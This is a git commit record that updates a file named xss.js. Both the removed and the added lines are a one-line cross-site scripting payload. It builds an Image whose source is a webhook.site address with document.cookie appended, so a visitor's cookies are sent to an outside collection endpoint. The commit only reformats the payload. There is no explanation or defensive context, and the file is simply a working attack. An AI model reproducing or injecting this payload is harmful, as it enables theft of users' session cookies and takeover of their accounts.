e0b919ede3cac7182a276bf5dce03bffa6b35b0b
Katashi <lucaskatashicruz@gmail.com>
2023-10-12 22:52:45 -0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,2 +1,1 @@
-let i = new Image;
-i.src = 'https://webhook.site/86e24e75-b0fa-48c2-bd0c-3eb70097a254'+document.cookie;
+var i=new Image;i.src="https://webhook.site/86e24e75-b0fa-48c2-bd0c-3eb70097a254/?c="+document.cookie;
